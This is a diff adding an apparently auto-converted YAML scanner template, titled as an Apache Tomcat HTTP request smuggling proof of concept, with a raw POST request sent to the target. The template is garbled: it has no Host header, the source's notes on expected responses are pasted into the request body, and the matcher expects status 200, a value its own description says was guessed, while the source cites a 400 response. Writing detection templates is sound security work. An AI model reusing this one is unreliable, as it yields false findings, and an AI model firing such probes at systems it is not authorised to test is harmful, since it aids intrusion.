@@ -1,0 +1,83 @@
+id: poc-qd19h1ggy6dqgwaz
+info:
+  name: Apache Tomcat HTTP 请求走私
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qd19h1ggy6dqgwaz
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qd19h1ggy6dqgwaz
+    fofa: 暂无
+http:
+- raw:
+  - 'POST / HTTP/1.1
+
+
+    Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
+
+
+    Sec-Ch-Ua-Mobile: ?0
+
+
+    Sec-Ch-Ua-Platform: "Linux"
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Sec-Fetch-Site: none
+
+
+    Sec-Fetch-Mode: navigate
+
+
+    Sec-Fetch-User: ?1
+
+
+    Sec-Fetch-Dest: document
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: en-US,en;q=0.9
+
+
+    Priority: u=0, i
+
+
+    Connection: keep-alive
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    X
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    HTTP Status 400
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
